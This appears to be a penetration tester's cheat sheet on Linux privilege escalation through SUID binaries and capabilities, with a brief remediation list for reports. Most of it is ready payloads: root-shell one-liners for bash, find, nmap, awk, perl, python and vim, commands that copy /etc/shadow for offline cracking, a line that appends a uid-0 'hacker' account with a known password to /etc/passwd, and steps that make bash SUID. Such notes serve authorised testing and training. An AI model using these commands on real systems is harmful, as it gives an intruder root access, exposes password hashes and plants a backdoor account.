# SUID / GTFOBins privilege escalation

A SUID binary runs with the **owner's** privileges regardless of who launches it.
If a root-owned SUID binary can run commands, read files, or write files, it
becomes a root primitive. [GTFOBins](https://gtfobins.github.io/) catalogues
which binaries do this and how.

## Find SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
# with details
find / -perm -4000 -exec ls -la {} \; 2>/dev/null
```

Compare the list against GTFOBins. Ignore the normal ones (`passwd`, `sudo`,
`mount`, `ping`, `su`) unless a specific CVE applies; hunt for the odd ones
(`find`, `nmap`, `vim`, `python`, `tar`, a custom binary).

## Workflow

1. `find` the SUID set.
2. For each unusual binary, open its GTFOBins page and look for the **SUID**
   section (not `sudo`/`limited SUID` unless that matches).
3. Run the payload. If it does not drop a root shell directly, use it to read
   `/etc/shadow`, write to `/etc/passwd`, or copy a shell and `chmod u+s` it.

## Ready payloads (root-owned SUID)

```bash
# Spawn a shell that keeps euid=0. -p stops bash from dropping privileges.
./bash -p                     # if bash itself is SUID

# find - the classic
find . -exec /bin/sh -p \; -quit

# nmap (old interactive mode, <=5.x)
nmap --interactive
# then:  !sh

# GTFOBins one-liners
env /bin/sh -p
awk 'BEGIN {system("/bin/sh -p")}'
perl -e 'exec "/bin/sh -p";'
python -c 'import os; os.setuid(0); os.system("/bin/sh -p")'      # or os.execl
python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

# editors -> shell
vim -c ':!/bin/sh -p'
# in less/more/man pager:   !/bin/sh
```

## Read/write primitives (no direct shell)

When the SUID binary only reads or writes files, escalate indirectly:

```bash
# READ /etc/shadow, then crack root offline (see hash-cracking.md)
./cp /etc/shadow /tmp/shadow && cat /tmp/shadow      # if cp is SUID
LFILE=/etc/shadow; base64 "$LFILE" | base64 -d       # base64 SUID trick
./tail -c1G /etc/shadow                               # tail/head SUID read

# WRITE a root user into /etc/passwd
openssl passwd -1 -salt x pass123                     # -> $1$x$...
echo 'hacker:$1$x$....:0:0::/root:/bin/bash' | ./tee -a /etc/passwd
su hacker            # password: pass123  -> uid 0
```

Generic pattern to make any shell root once you can write as root:

```bash
# from a root-write primitive, make bash SUID:
./<binary write> ... chmod u+s /bin/bash
bash -p
```

## Capabilities (a close cousin)

Not SUID but the same idea - a binary with `cap_setuid`:

```bash
getcap -r / 2>/dev/null
# e.g. python with cap_setuid+ep:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Remediation (for the report)

- Remove the SUID bit (`chmod u-s <file>`) from anything that does not need it.
- Never make interpreters, editors, or archivers SUID.
- Prefer fine-grained capabilities over SUID, and audit them too.

## References

- GTFOBins: https://gtfobins.github.io/
- HackTricks - SUID / capabilities: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- See also `privesc.md` and `docker-group-privesc.md` in this folder.
